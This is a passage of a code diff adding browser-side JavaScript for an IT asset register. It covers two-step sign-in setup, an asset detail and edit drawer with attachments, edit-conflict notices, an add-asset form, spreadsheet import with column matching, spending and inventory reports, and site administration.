+  if(start)start.onclick=async()=>{
+    start.disabled=true;
+    try{ MFASETUP=await API.mfaSetup(); render(); }
+    catch(e){ if(handleAuthLoss(e))return; start.disabled=false; err(e.message); }
+  };
+  const cancel=document.getElementById('mfacancel');
+  if(cancel)cancel.onclick=()=>{MFASETUP=null;render();};
+
+  const on=document.getElementById('mfaon');
+  if(on)on.onclick=async()=>{
+    on.disabled=true;
+    try{
+      const r=await API.mfaEnable(document.getElementById('mfacode').value.trim());
+      MFACODES=r.backupCodes; MFASETUP=null; ME.mfaEnabled=true; render();
+    }catch(e){ if(handleAuthLoss(e))return; on.disabled=false; err(e.message); }
+  };
+
+  const copy=document.getElementById('mfacopy');
+  if(copy)copy.onclick=()=>{
+    const text=MFACODES.join('\n');
+    if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(text).then(()=>toast('Copied'),()=>toast('Copy failed \u2014 select them by hand'));
+    else toast('Select the codes and copy them by hand');
+  };
+  const done=document.getElementById('mfadone');
+  if(done)done.onclick=close;
+
+  const off=document.getElementById('mfaoff');
+  if(off)off.onclick=async()=>{
+    off.disabled=true;
+    try{
+      await API.mfaDisable(document.getElementById('mfapw').value);
+      ME.mfaEnabled=false; MFASETUP=null; MFACODES=null; render(); toast('Two-step sign-in turned off.');
+    }catch(e){ if(handleAuthLoss(e))return; off.disabled=false; err(e.message); }
+  };
+}
+/* ---------- asset drawer ---------- */
+function fieldInput(f,val,idp){
+  const id=idp+f.key;
+  if(f.type==='select')return `<select id="${id}"><option value=""></option>${f.options.map(o=>`<option ${val===o?'selected':''}>${esc(o)}</option>`).join('')}</select>`;
+  const t=f.type==='number'?'number':f.type==='date'?'date':'text';
+  return `<input type="${t}" id="${id}" value="${esc(val||'')}">`;
+}
+function openDrawer(id,keep){
+  const a=S.assets.find(x=>x.id===id);if(!a)return;
+  DRAWER=id;
+  if(!keep)document.querySelectorAll('.scrim,.drawer').forEach(n=>n.remove());
+  else document.querySelectorAll('.scrim,.drawer').forEach(n=>n.remove());
+  const ed=can('edit');
+  const wrap=document.createElement('div');
+  wrap.innerHTML=`
+  <div class="scrim" id="scrim"></div>
+  <aside class="drawer" role="dialog" aria-label="Asset detail">
+    <header>
+      <div><h2 class="mono">${esc(a.tag)}</h2><span style="color:var(--muted);font-size:12.5px">${esc(a.brand)} ${esc(a.model)}</span></div>
+      <button class="btn sm" id="dclose" style="margin-left:auto">Close</button>
+    </header>
+    <div class="in">
+      ${ed?`
+      <div class="g2">
+        <label class="f"><span>Assigned to</span><input type="text" id="e_user" value="${esc(a.user)}"></label>
+        <label class="f"><span>Department</span><select id="e_dept">${S.depts.map(d=>`<option ${a.dept===d.name?'selected':''}>${esc(d.name)}</option>`).join('')}</select></label>
+        <label class="f"><span>Site</span><select id="e_site">${S.sites.map(s=>`<option value="${s.code}" ${a.siteCode===s.code?'selected':''}>${esc(s.name)}</option>`).join('')}</select></label>
+        <label class="f"><span>Status</span><select id="e_status">${STATUSES.map(s=>`<option ${a.status===s?'selected':''}>${s}</option>`).join('')}</select></label>
+        <label class="f"><span>Type</span><select id="e_type">${['Desktop','All-in-One','Laptop','Printer','Server','Network'].map(s=>`<option ${a.type===s?'selected':''}>${s}</option>`).join('')}</select></label>
+        <label class="f"><span>Make</span><input type="text" id="e_brand" value="${esc(a.brand)}"></label>
+        <label class="f"><span>Model</span><input type="text" id="e_model" value="${esc(a.model)}"></label>
+        <label class="f"><span>Serial number</span><input type="text" id="e_serial" value="${esc(a.serial)}"></label>
+        <label class="f"><span>Processor</span><input type="text" id="e_cpu" value="${esc(a.cpu)}"></label>
+        <label class="f"><span>Memory</span><input type="text" id="e_ram" value="${esc(a.ram)}"></label>
+        <label class="f"><span>Storage</span><input type="text" id="e_storage" value="${esc(a.storage)}"></label>
+        <label class="f"><span>Operating system</span><input type="text" id="e_os" value="${esc(a.os)}"></label>
+        <label class="f"><span>Vendor</span><input type="text" id="e_vendor" value="${esc(a.vendor||'')}" placeholder="Who it was bought from"></label>
+        <label class="f"><span>Purchase price (\u20B9)</span><input type="text" id="e_purchasePrice" class="mono" value="${a.purchasePrice==null?'':a.purchasePrice}" placeholder="Leave blank if unknown"></label>
+        <label class="f"><span>Purchase year</span><input type="number" id="e_purchaseYear" value="${esc(a.purchaseYear)}"></label>
+        <label class="f"><span>Warranty end</span><input type="date" id="e_warrantyEnd" value="${esc(a.warrantyEnd)}"></label>
+      </div>
+      ${S.fields.length?`<h3 style="margin:6px 0 8px">Additional fields</h3><div class="g2">
+        ${S.fields.map(f=>`<label class="f"><span>${esc(f.label)}${f.required?' <i>*</i>':''}</span>${fieldInput(f,(a.custom||{})[f.key],'e_cf_')}</label>`).join('')}
+      </div>`:''}
+      `:`
+      <dl class="kv">
+        <dt>Assigned to</dt><dd>${esc(a.user)}</dd>
+        <dt>Department</dt><dd>${esc(a.dept)}</dd>
+        <dt>Site</dt><dd>${esc(siteName(a.siteCode))}</dd>
+        <dt>Status</dt><dd><span class="pill ${statusCls(a.status)}">${esc(a.status)}</span></dd>
+        <dt>Make and model</dt><dd>${esc(a.brand)} ${esc(a.model)}</dd>
+        <dt>Serial number</dt><dd class="mono">${esc(a.serial)}</dd>
+        <dt>Processor</dt><dd>${esc(a.cpu)}</dd>
+        <dt>Memory</dt><dd>${esc(a.ram)}</dd>
+        <dt>Storage</dt><dd>${esc(a.storage)}</dd>
+        <dt>Operating system</dt><dd>${esc(a.os)}</dd>
+        <dt>Vendor</dt><dd>${a.vendor?esc(a.vendor):'Not recorded'}</dd>
+        <dt>Purchase price</dt><dd class="mono">${money(a.purchasePrice)}</dd>
+        <dt>Warranty end</dt><dd>${esc(a.warrantyEnd)}</dd>
+        ${S.fields.map(f=>`<dt>${esc(f.label)}</dt><dd>${esc((a.custom||{})[f.key]||'—')}</dd>`).join('')}
+      </dl>`}
+
+      <h3 style="margin:16px 0 8px">Attachments</h3>
+      <div id="files">${(a.files||[]).length?(a.files||[]).map((f,i)=>`<div class="row" style="justify-content:space-between;border-bottom:1px solid var(--line2);padding:5px 0">
+        <span>${f.data?`<a href="${f.data}" download="${esc(f.name)}">${esc(f.name)}</a>`:esc(f.name)} <span style="color:var(--muted);font-size:12px">${(f.size/1024).toFixed(0)} KB</span></span>
+        ${ed?`<button class="btn sm d" data-rmf="${i}">Remove</button>`:''}
+      </div>`).join(''):'<p style="color:var(--muted);margin:0">No files attached.</p>'}</div>
+      ${ed?`<div style="margin-top:9px"><input type="file" id="fup" multiple>
+      <p class="note" style="margin-top:8px">Files under 120 KB are stored and downloadable. Larger files are recorded by name and size only, so the register stays within its storage limit.</p></div>`:''}
+    </div>
+    <footer>
+      ${ed?`<button class="btn p" id="dsave">Save changes</button>`:''}
+      ${can('admin')?`<button class="btn d" id="ddel">Delete asset</button>`:''}
+      <span style="margin-left:auto;color:var(--muted);font-size:12px;align-self:center">${esc(a.tag)}</span>
+    </footer>
+  </aside>`;
+  document.body.appendChild(wrap);
+  const close=()=>{DRAWER=null;wrap.remove();};
+  wrap.querySelector('#scrim').onclick=close;
+  wrap.querySelector('#dclose').onclick=close;
+  document.addEventListener('keydown',function k(e){if(e.key==='Escape'){close();document.removeEventListener('keydown',k);}});
+  wrap.querySelectorAll('[data-rmf]').forEach(b=>b.onclick=()=>{a.files.splice(+b.dataset.rmf,1);save();openDrawer(id);});
+  const fup=wrap.querySelector('#fup');
+  if(fup)fup.onchange=e=>{
+    const fs=[...e.target.files];let pending=fs.length;
+    if(!pending)return;
+    fs.forEach(f=>{
+      if(f.size<120*1024){
+        const r=new FileReader();
+        r.onload=()=>{a.files.push({name:f.name,size:f.size,data:r.result});if(!--pending){save();logit('Attachment added',f.name+' on '+a.tag);openDrawer(id);}};
+        r.onerror=()=>{a.files.push({name:f.name,size:f.size});if(!--pending){save();openDrawer(id);}};
+        r.readAsDataURL(f);
+      }else{
+        a.files.push({name:f.name,size:f.size});
+        if(!--pending){save();logit('Attachment recorded',f.name+' on '+a.tag);openDrawer(id);}
+      }
+    });
+  };
+  const ds=wrap.querySelector('#dsave');
+  if(ds)ds.onclick=async()=>{
+    const g=k=>wrap.querySelector('#e_'+k).value;
+    const patch={version:a.version};
+    ['user','dept','status','type','brand','model','serial','cpu','ram','storage','os','warrantyEnd','vendor']
+      .forEach(k=>patch[k]=g(k).trim());
+    patch.siteCode=g('site');
+    patch.purchaseYear=+g('purchaseYear')||a.purchaseYear;
+    const rawPrice=g('purchasePrice').trim();
+    patch.purchasePrice=rawPrice===''?null:rawPrice;
+    const custom={};let missing=null;
+    S.fields.forEach(f=>{
+      const v=wrap.querySelector('#e_cf_'+f.key).value.trim();
+      if(f.required&&!v)missing=f.label;
+      custom[f.key]=v;
+    });
+    if(missing){toast(missing+' is required');return;}
+    patch.custom=custom;
+    ds.disabled=true;
+    try{
+      const r=await API.updateAsset(a.id,patch);
+      putLocalAsset(r.asset);
+      close();render();toast('Saved '+r.asset.tag);
+    }catch(err){
+      ds.disabled=false;
+      if(handleAuthLoss(err))return;
+      if(err.code==='CONFLICT'&&err.current){
+        // Someone else got there first. Show what they changed rather than
+        // overwriting it; the person decides what to do next.
+        putLocalAsset(err.current);
+        close();render();
+        showConflict(err.current);
+        return;
+      }
+      toast(err.message);
+    }
+  };
+  const dd=wrap.querySelector('#ddel');
+  if(dd)dd.onclick=async()=>{
+    if(!confirm('Delete '+a.tag+'?'))return;
+    try{
+      await API.deleteAsset(a.id);
+      S.assets=S.assets.filter(x=>x.id!==a.id);SEL.delete(a.id);
+      close();render();toast('Deleted '+a.tag);
+    }catch(err){ if(!handleAuthLoss(err))toast(err.message); }
+  };
+}
+
+/** Explains a rejected write instead of silently discarding one side of it. */
+function showConflict(current){
+  const wrap=document.createElement('div');
+  wrap.innerHTML=`<div class="modal" role="dialog" aria-modal="true" aria-label="Edit conflict"><div class="box">
+    <h2>Someone else changed this asset</h2>
+    <p>Your change was not saved, because <strong>${esc(current.tag)}</strong> was updated by someone else while you had it open. Nothing was overwritten. The row below is what is stored now — reopen it and apply your change on top.</p>
+    <dl class="kv">
+      <dt>Assigned to</dt><dd>${esc(current.user)}</dd>
+      <dt>Department</dt><dd>${esc(current.dept)}</dd>
+      <dt>Status</dt><dd>${esc(current.status)}</dd>
+      <dt>Vendor</dt><dd>${current.vendor?esc(current.vendor):'Not recorded'}</dd>
+      <dt>Purchase price</dt><dd>${money(current.purchasePrice)}</dd>
+      <dt>Last updated</dt><dd>${esc(fmtDT(current.updatedAt))}</dd>
+    </dl>
+    <div class="row" style="margin-top:14px">
+      <button class="btn p" id="cfopen">Open the current version</button>
+      <button class="btn" id="cfclose">Close</button>
+    </div>
+  </div></div>`;
+  document.body.appendChild(wrap);
+  wrap.querySelector('#cfclose').onclick=()=>wrap.remove();
+  wrap.querySelector('#cfopen').onclick=()=>{wrap.remove();openDrawer(current.id);};
+}
+
+/* ---------- add asset ---------- */
+function nextTag(code){
+  const n=S.assets.filter(a=>a.siteCode===code).length+1;
+  let t,i=n;
+  do{t=code+'-PC-'+String(i).padStart(3,'0');i++;}while(S.assets.some(a=>a.tag===t));
+  return t;
+}
+function vAdd(v){
+  if(!can('edit')){v.innerHTML='<div class="empty"><b>Read-only access</b>Your role cannot add assets. Switch to an Admin or Manager account.</div>';return;}
+  v.innerHTML=`
+  <div class="card" style="max-width:880px">
+    <header><h2>New asset</h2><span style="margin-left:auto;color:var(--muted);font-size:12.5px">Asset tag is generated from the site code</span></header>
+    <div class="in">
+      <div class="g2">
+        <label class="f"><span>Site <i>*</i></span><select id="n_site">${S.sites.map(s=>`<option value="${s.code}">${esc(s.name)}</option>`).join('')}</select></label>
+        <label class="f"><span>Asset tag</span><input type="text" id="n_tag" class="mono"></label>
+        <label class="f"><span>Assigned to <i>*</i></span><input type="text" id="n_user" placeholder="User name or shared purpose"></label>
+        <label class="f"><span>Department</span><select id="n_dept">${S.depts.map(d=>`<option>${esc(d.name)}</option>`).join('')}</select></label>
+        <label class="f"><span>Type</span><select id="n_type">${['Desktop','All-in-One','Laptop','Printer','Server','Network'].map(s=>`<option>${s}</option>`).join('')}</select></label>
+        <label class="f"><span>Status</span><select id="n_status">${STATUSES.map(s=>`<option ${s==='In use'?'selected':''}>${s}</option>`).join('')}</select></label>
+        <label class="f"><span>Make</span><input type="text" id="n_brand" placeholder="Lenovo, HP, Dell…"></label>
+        <label class="f"><span>Model</span><input type="text" id="n_model"></label>
+        <label class="f"><span>Serial number</span><input type="text" id="n_serial"></label>
+        <label class="f"><span>Processor</span><input type="text" id="n_cpu"></label>
+        <label class="f"><span>Memory</span><input type="text" id="n_ram" placeholder="8 GB"></label>
+        <label class="f"><span>Storage</span><input type="text" id="n_storage" placeholder="512 GB SSD"></label>
+        <label class="f"><span>Operating system</span><input type="text" id="n_os" placeholder="Windows 11 Pro"></label>
+        <label class="f"><span>Vendor</span><input type="text" id="n_vendor" placeholder="Who it was bought from"></label>
+        <label class="f"><span>Purchase price (\u20B9)</span><input type="text" id="n_purchasePrice" class="mono" placeholder="Leave blank if unknown"></label>
+        <label class="f"><span>Purchase year</span><input type="number" id="n_purchaseYear" value="${YEAR}"></label>
+        <label class="f"><span>Warranty end</span><input type="date" id="n_warrantyEnd"></label>
+      </div>
+      ${S.fields.length?`<h3 style="margin:6px 0 8px">Additional fields</h3><div class="g2">
+        ${S.fields.map(f=>`<label class="f"><span>${esc(f.label)}${f.required?' <i>*</i>':''}</span>${fieldInput(f,'','n_cf_')}</label>`).join('')}
+      </div>`:'<p class="note">No custom fields defined yet. Add them under Custom fields and they appear here automatically.</p>'}
+      <div class="row" style="margin-top:8px">
+        <button class="btn p" id="nsave">Add asset</button>
+        <button class="btn" id="nreset">Reset form</button>
+      </div>
+    </div>
+  </div>`;
+  const setTag=()=>$('#n_tag').value=nextTag($('#n_site').value);
+  setTag();$('#n_site').onchange=setTag;
+  $('#nreset').onclick=()=>{VIEW='add';render();};
+  $('#nsave').onclick=async()=>{
+    const g=k=>$('#n_'+k).value.trim();
+    if(!g('user')){toast('Assigned to is required');$('#n_user').focus();return;}
+    const custom={};let missing=null;
+    S.fields.forEach(f=>{const v=$('#n_cf_'+f.key).value.trim();if(f.required&&!v)missing=f.label;custom[f.key]=v;});
+    if(missing){toast(missing+' is required');return;}
+    const rawPrice=g('purchasePrice');
+    const btn=$('#nsave');btn.disabled=true;
+    try{
+      const r=await API.createAsset({
+        tag:g('tag'),serial:g('serial'),type:g('type'),brand:g('brand')||'Unbranded',
+        model:g('model'),user:g('user'),dept:g('dept'),siteCode:g('site'),cpu:g('cpu'),
+        ram:g('ram'),storage:g('storage'),os:g('os'),status:g('status'),vendor:g('vendor'),
+        purchasePrice:rawPrice===''?null:rawPrice,purchaseYear:+g('purchaseYear')||YEAR,
+        warrantyEnd:g('warrantyEnd'),custom
+      });
+      putLocalAsset(r.asset);
+      VIEW='assets';F={...F,q:r.asset.tag,page:1};render();toast('Added '+r.asset.tag);
+    }catch(err){
+      btn.disabled=false;
+      if(handleAuthLoss(err))return;
+      if(err.fields){
+        const first=Object.values(err.fields)[0];
+        toast(first||err.message);
+      } else toast(err.message);
+    }
+  };
+}
+/* ---------- import ---------- */
+const TARGETS=[
+  {k:'tag',t:'Asset tag'},{k:'serial',t:'Serial number'},{k:'type',t:'Type'},{k:'brand',t:'Make'},
+  {k:'model',t:'Model'},{k:'user',t:'Assigned to'},{k:'dept',t:'Department'},{k:'siteCode',t:'Site code'},
+  {k:'cpu',t:'Processor'},{k:'ram',t:'Memory'},{k:'storage',t:'Storage'},{k:'os',t:'Operating system'},
+  {k:'status',t:'Status'},{k:'vendor',t:'Vendor'},{k:'purchasePrice',t:'Purchase price'},
+  {k:'purchaseYear',t:'Purchase year'},{k:'warrantyEnd',t:'Warranty end'}
+];
+function guessMap(h){
+  const s=String(h).toLowerCase().replace(/[^a-z0-9]/g,'');
+  const g={
+    tag:['assettag','tag','assetid','assetcode','assetno'],
+    serial:['serial','serialnumber','serialno','sno'],
+    siteCode:['site','sitename','sitecode','location','branch','office'],
+    dept:['dept','department','division'],
+    user:['username','user','assignedto','employee','name','owner','custodian'],
+    type:['type','assettype','devicetype','desktopaio','category'],
+    brand:['make','brand','manufacturer','oem'],
+    model:['model','machine','modelno'],
+    cpu:['cpu','processor','proc'],
+    ram:['ram','memory'],
+    storage:['storage','hdd','ssd','harddisk','hddssd','disk','harddrive'],
+    os:['os','operatingsystem','windows'],
+    status:['status','condition','state'],
+    vendor:['vendor','supplier','vendorname','suppliername','purchasedfrom','boughtfrom','dealer','seller','party'],
+    purchasePrice:['price','purchaseprice','cost','amount','rate','value','invoiceamount','purchasecost'],
+    purchaseYear:['purchaseyear','year','purchased','purchasedate','buyyear'],
+    warrantyEnd:['warrantyend','warranty','amcend','expiry','warrantyexpiry']
+  };
+  // vendor is matched before user: a column headed "supplier name" ends in "name",
+  // which would otherwise be read as the person the asset is assigned to.
+  const order=['tag','serial','siteCode','dept','vendor','purchasePrice','user','type','brand','model','cpu','ram','storage','os','status','purchaseYear','warrantyEnd'];
+  for(const k of order)if(g[k].some(x=>s===x))return k;
+  for(const k of order)if(g[k].some(x=>x.length>3&&s.includes(x)))return k;
+  return '';
+}
+function vImport(v){
+  if(!can('edit')){v.innerHTML='<div class="empty"><b>Read-only access</b>Your role cannot import data.</div>';return;}
+  v.innerHTML=`
+  <div class="grid" style="gap:14px;max-width:1000px">
+    <div class="card">
+      <header><h2>Load a file</h2></header>
+      <div class="in">
+        <div class="row" style="margin-bottom:10px">
+          <input type="file" id="ifile" accept=".csv,.txt,.xlsx,.xls" style="width:auto">
+          <span style="color:var(--muted);font-size:12.5px">CSV, or Excel if the reader loads</span>
+        </div>
+        <label class="f"><span>Or paste rows, first line is the header</span>
+          <textarea id="ipaste" rows="6" placeholder="Asset tag,User name,Department,Site,Model,RAM"></textarea></label>
+        <button class="btn p" id="iparse">Read rows</button>
+      </div>
+    </div>
+    <div id="imapping"></div>
+  </div>`;
+  $('#iparse').onclick=()=>{
+    const t=$('#ipaste').value.trim();
+    if(!t){toast('Paste some rows first, or choose a file');return;}
+    stage(csvParse(t));
+  };
+  $('#ifile').onchange=e=>{
+    const f=e.target.files[0];if(!f)return;
+    if(/\.(xlsx|xls)$/i.test(f.name))return readXlsx(f);
+    const r=new FileReader();
+    r.onload=()=>stage(csvParse(r.result));
+    r.onerror=()=>toast('Could not read that file');
+    r.readAsText(f);
+  };
+  function readXlsx(f){
+    const go=()=>{
+      const r=new FileReader();
+      r.onload=()=>{
+        try{
+          const wb=XLSX.read(new Uint8Array(r.result),{type:'array'});
+          const ws=wb.Sheets[wb.SheetNames[0]];
+          const rows=XLSX.utils.sheet_to_json(ws,{header:1,blankrows:false}).map(row=>row.map(c=>c==null?'':String(c)));
+          stage(rows.filter(row=>row.some(c=>c.trim()!=='')));
+        }catch(err){toast('Could not read that workbook');}
+      };
+      r.readAsArrayBuffer(f);
+    };
+    if(window.XLSX)return go();
+    const s=document.createElement('script');
+    s.src='https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js';
+    s.onload=go;
+    s.onerror=()=>toast('Excel reader unavailable. Save the sheet as CSV and try again.');
+    document.head.appendChild(s);
+  }
+  function stage(rows){
+    if(rows.length<2){toast('Need a header row and at least one data row');return;}
+    IMPORTED={head:rows[0].map(h=>String(h).trim()),rows:rows.slice(1)};
+    drawMap();
+  }
+  function drawMap(){
+    const {head,rows}=IMPORTED;
+    const auto=head.map(guessMap);
+    $('#imapping').innerHTML=`
+    <div class="card">
+      <header><h2>Match columns</h2><span style="margin-left:auto;color:var(--muted);font-size:12.5px">${rows.length} rows read</span></header>
+      <div class="in">
+        <div class="g2">
+          ${head.map((h,i)=>`<label class="f"><span>${esc(h)||'Column '+(i+1)}</span>
+            <select data-map="${i}"><option value="">Ignore this column</option>
+            ${TARGETS.map(t=>`<option value="${t.k}" ${auto[i]===t.k?'selected':''}>${t.t}</option>`).join('')}
+            ${S.fields.map(f=>`<option value="cf:${f.key}">${esc(f.label)}</option>`).join('')}
+            </select></label>`).join('')}
+        </div>
+        <label class="f" style="max-width:320px"><span>Site for rows with no site column</span>
+          <select id="idefsite">${S.sites.map(s=>`<option value="${s.code}">${esc(s.name)}</option>`).join('')}</select></label>
+        <div class="note" style="margin-bottom:12px">Rows whose asset tag already exists will update that asset instead of creating a duplicate.</div>
+        <h3 style="margin-bottom:6px">Preview</h3>
+        <div class="tw" style="max-height:230px;margin-bottom:12px"><table><thead><tr>${head.map(h=>`<th>${esc(h)}</th>`).join('')}</tr></thead>
+          <tbody>${rows.slice(0,5).map(r=>`<tr>${head.map((_,i)=>`<td><span class="trunc">${esc(r[i]||'')}</span></td>`).join('')}</tr>`).join('')}</tbody></table></div>
+        <div class="row"><button class="btn p" id="idoit">Import ${rows.length} rows</button><button class="btn" id="icancel">Cancel</button></div>
+      </div>
+    </div>`;
+    $('#icancel').onclick=()=>{IMPORTED=null;$('#imapping').innerHTML='';};
+    $('#idoit').onclick=doImport;
+  }
+  async function doImport(){
+    const {head,rows}=IMPORTED;
+    const map=[...document.querySelectorAll('[data-map]')].map(s=>s.value);
+    if(!map.some(m=>m==='user'||m==='tag')){toast('Match at least an asset tag or an assigned-to column');return;}
+    const defSite=$('#idefsite').value;
+    const btn=$('#idoit');btn.disabled=true;btn.textContent='Importing…';
+
+    // Shape the rows here; the server re-validates every field and applies the
+    // whole batch in one transaction.
+    const payload=rows.map(r=>{
+      const rec={defaultSite:defSite,custom:{}};
+      map.forEach((m,i)=>{
+        if(!m)return;
+        const val=String(r[i]==null?'':r[i]).trim();
+        if(m.startsWith('cf:'))rec.custom[m.slice(3)]=val;
+        else rec[m]=val;
+      });
+      return rec;
+    });
+    try{
+      const r=await API.importAssets(payload);
+      const b=await API.bootstrap();
+      S.assets=b.assets;S.depts=b.depts;
+      IMPORTED=null;VIEW='assets';F={...F,q:'',page:1};render();
+      toast(`${r.created} added, ${r.updated} updated${r.skipped?`, ${r.skipped} skipped`:''}`);
+    }catch(err){
+      btn.disabled=false;btn.textContent='Import '+rows.length+' rows';
+      if(!handleAuthLoss(err))toast(err.message);
+    }
+  }
+}
+
+/* ---------- reports ---------- */
+const REPORTS=[
+  {id:'site',t:'Assets by site',d:'Machine count and replacement exposure for each location.',
+   run:A=>{const m={};A.forEach(a=>{m[a.siteCode]=m[a.siteCode]||{n:0,rep:0,low:0};m[a.siteCode].n++;if(a.status==='Replace due')m[a.siteCode].rep++;if(ramGB(a)>0&&ramGB(a)<=4)m[a.siteCode].low++;});
+     return{head:['Site','Assets','Replace due','4 GB or less'],rows:Object.entries(m).sort((a,b)=>b[1].n-a[1].n).map(([c,x])=>[siteName(c),x.n,x.rep,x.low])};}},
+  {id:'replace',t:'Replacement candidates',d:'Every machine flagged for replacement, oldest first.',
+   run:A=>({head:['Asset tag','Site','Assigned to','Processor','Memory','Purchase year'],
+     rows:A.filter(a=>a.status==='Replace due').sort((a,b)=>a.purchaseYear-b.purchaseYear).map(a=>[a.tag,siteName(a.siteCode),a.user,a.cpu,a.ram,a.purchaseYear])})},
+  {id:'dept',t:'Assets by department',d:'Where the fleet sits across the business.',
+   run:A=>{const m={};A.forEach(a=>m[a.dept]=(m[a.dept]||0)+1);
+     return{head:['Department','Assets'],rows:Object.entries(m).sort((a,b)=>b[1]-a[1])};}},
+  {id:'os',t:'Operating system spread',d:'Useful for patching and licence planning.',
+   run:A=>{const m={};A.forEach(a=>m[a.os||'Not recorded']=(m[a.os||'Not recorded']||0)+1);
+     return{head:['Operating system','Assets'],rows:Object.entries(m).sort((a,b)=>b[1]-a[1])};}},
+  {id:'warr',t:'Warranty expired',d:'Assets past their warranty end date.',
+   run:A=>({head:['Asset tag','Site','Assigned to','Make','Warranty end'],
+     rows:A.filter(a=>a.warrantyEnd&&new Date(a.warrantyEnd)<new Date()).sort((a,b)=>a.warrantyEnd<b.warrantyEnd?-1:1).map(a=>[a.tag,siteName(a.siteCode),a.user,a.brand,a.warrantyEnd])})},
+  {id:'ram',t:'Memory below 8 GB',d:'The upgrade shortlist, cheapest fix before replacement.',
+   run:A=>({head:['Asset tag','Site','Assigned to','Memory','Processor'],
+     rows:A.filter(a=>ramGB(a)>0&&ramGB(a)<8).sort((a,b)=>ramGB(a)-ramGB(b)).map(a=>[a.tag,siteName(a.siteCode),a.user,a.ram,a.cpu])})},
+  {id:'vendor',t:'Spend by vendor',d:'What was bought from whom, and what it cost.',
+   run:A=>{const m={};A.forEach(a=>{const v=a.vendor||'Not recorded';m[v]=m[v]||{n:0,amt:0,priced:0};
+     m[v].n++;if(a.purchasePrice!=null){m[v].amt+=a.purchasePrice;m[v].priced++;}});
+     return{head:['Vendor','Assets','With a price','Total spend','Average'],
+       rows:Object.entries(m).sort((a,b)=>b[1].amt-a[1].amt).map(([v,x])=>
+         [v,x.n,x.priced,money(x.amt||null),x.priced?money(x.amt/x.priced):'\u2014'])};}},
+  {id:'spendsite',t:'Spend by site',d:'Where the money went across locations.',
+   run:A=>{const m={};A.forEach(a=>{m[a.siteCode]=m[a.siteCode]||{n:0,amt:0,priced:0};
+     m[a.siteCode].n++;if(a.purchasePrice!=null){m[a.siteCode].amt+=a.purchasePrice;m[a.siteCode].priced++;}});
+     return{head:['Site','Assets','With a price','Total spend'],
+       rows:Object.entries(m).sort((a,b)=>b[1].amt-a[1].amt).map(([c,x])=>
+         [siteName(c),x.n,x.priced,money(x.amt||null)])};}},
+  {id:'noprice',t:'Missing purchase details',d:'Assets with no vendor or no price on record.',
+   run:A=>({head:['Asset tag','Site','Assigned to','Vendor','Purchase price'],
+     rows:A.filter(a=>!a.vendor||a.purchasePrice==null).map(a=>
+       [a.tag,siteName(a.siteCode),a.user,a.vendor||'Not recorded',money(a.purchasePrice)])})},
+  {id:'make',t:'Make and model mix',d:'Manufacturer concentration across the estate.',
+   run:A=>{const m={};A.forEach(a=>m[a.brand]=(m[a.brand]||0)+1);
+     return{head:['Make','Assets'],rows:Object.entries(m).sort((a,b)=>b[1]-a[1])};}}
+];
+let RPT='site';
+function vReports(v){
+  const A=scopedAssets();
+  const r=REPORTS.find(x=>x.id===RPT)||REPORTS[0];
+  const out=r.run(A);
+  v.innerHTML=`
+  <div class="tabs noprint">${REPORTS.map(x=>`<button data-r="${x.id}" class="${x.id===RPT?'on':''}">${x.t}</button>`).join('')}</div>
+  <div class="card">
+    <header><div><h2>${r.t}</h2><span style="color:var(--muted);font-size:12.5px">${r.d}</span></div>
+      <button class="btn noprint" id="rcsv" style="margin-left:auto">Export CSV</button>
+      <button class="btn noprint" id="rprint">Print</button></header>
+    <div class="tw"><table><thead><tr>${out.head.map(h=>`<th>${esc(h)}</th>`).join('')}</tr></thead>
+      <tbody>${out.rows.length?out.rows.map(row=>`<tr>${row.map((c,i)=>`<td class="${i&&typeof c==='number'?'mono':''}">${esc(c)}</td>`).join('')}</tr>`).join('')
+        :`<tr><td colspan="${out.head.length}"><div class="empty"><b>Nothing to report</b>No assets meet this report's criteria right now.</div></td></tr>`}</tbody></table></div>
+    <div class="in" style="border-top:1px solid var(--line2);color:var(--muted);font-size:12.5px">${out.rows.length} rows</div>
+  </div>`;
+  v.querySelectorAll('[data-r]').forEach(b=>b.onclick=()=>{RPT=b.dataset.r;render();});
+  $('#rcsv').onclick=()=>{download(r.id+'-report.csv',[out.head,...out.rows].map(x=>x.map(csvCell).join(',')).join('\n'));toast('Exported');};
+  $('#rprint').onclick=()=>window.print();
+}
+/* ---------- admin: sites & companies ---------- */
+function guard(v){
+  if(can('admin'))return false;
+  v.innerHTML='<div class="empty"><b>Administrator access required</b>Switch to an Admin account to manage this section.</div>';
+  return true;
+}
+function vSites(v){
+  if(guard(v))return;
+  const count=c=>S.assets.filter(a=>a.siteCode===c).length;
+  v.innerHTML=`
+  <div class="grid" style="gap:14px;max-width:1000px">
+    <div class="card">
+      <header><h2>Companies</h2></header>
+      <div class="tw"><table><thead><tr><th>Name</th><th>Code</th><th>Sites</th><th class="noprint"></th></tr></thead><tbody>
+        ${S.companies.map(c=>`<tr><td>${esc(c.name)}</td><td class="mono">${esc(c.code)}</td>
+          <td class="mono">${S.sites.filter(s=>s.companyId===c.id).length}</td>
+          <td class="noprint"><button class="btn sm d" data-delc="${c.id}">Remove</button></td></tr>`).join('')}
+      </tbody></table></div>
+      <div class="in row">
+        <input type="text" id="cname" placeholder="Company name" style="width:230px">
+        <input type="text" id="ccode" placeholder="Code" style="width:90px" class="mono">
+        <button class="btn p" id="caddb">Add company</button>
+      </div>
+    </div>
+    <div class="card">
+      <header><h2>Sites</h2><span style="margin-left:auto;color:var(--muted);font-size:12.5px">Site code prefixes every asset tag</span></header>
+      <div class="tw"><table><thead><tr><th>Site</th><th>Code</th><th>Location</th><th>Company</th><th>Assets</th><th class="noprint"></th></tr></thead><tbody>
+        ${S.sites.map(s=>`<tr>
+          <td>${esc(s.name)}</td>
+          <td class="mono">${esc(s.code)}</td>
+          <td>${esc(s.location||'\u2014')}</td>
+          <td>${esc((S.companies.find(c=>c.id===s.companyId)||{}).name||'—')}</td>
+          <td class="mono">${count(s.code)}</td>
+          <td class="noprint"><button class="btn sm d" data-dels="${s.id}" ${count(s.code)?'disabled title="Move its assets first"':''}>Remove</button></td>
+        </tr>`).join('')}
+      </tbody></table></div>
+      <div class="in row">
+        <input type="text" id="sname" placeholder="Site name" style="width:210px">
+        <input type="text" id="scode" placeholder="Code" style="width:80px" class="mono">
+        <input type="text" id="sloc" placeholder="Location" style="width:170px">
+        <select id="scomp" style="width:auto">${S.companies.map(c=>`<option value="${c.id}">${esc(c.name)}</option>`).join('')}</select>
+        <button class="btn p" id="saddb">Add site</button>
+      </div>
+    </div>
+  </div>`;
+  const run=async(fn,ok)=>{
